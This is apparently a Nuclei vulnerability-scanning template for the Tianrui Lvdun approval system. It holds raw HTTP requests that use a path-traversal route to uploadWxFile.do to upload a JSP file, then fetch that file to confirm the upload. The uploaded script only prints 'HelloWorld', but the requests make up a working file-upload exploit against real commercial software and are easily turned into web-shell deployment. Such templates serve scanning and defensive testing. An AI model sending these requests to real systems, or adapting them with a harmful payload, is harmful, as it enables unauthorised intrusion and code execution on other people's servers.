id: poc-qbg8tyk2eifkewmn
info:
  name: 天锐绿盾审批系统 uploadWxFile 文件上传漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: file-upload,2025
http:
- raw:
  - 'POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj


    ------WebKitFormBoundaryFfJZ4PlAZBixjELj

    Content-Disposition: form-data; name="file"; filename="hello.jsp"

    Content-Type: application/octet-stream


    <% out.println("HelloWorld");%>

    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /hello.jsp HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
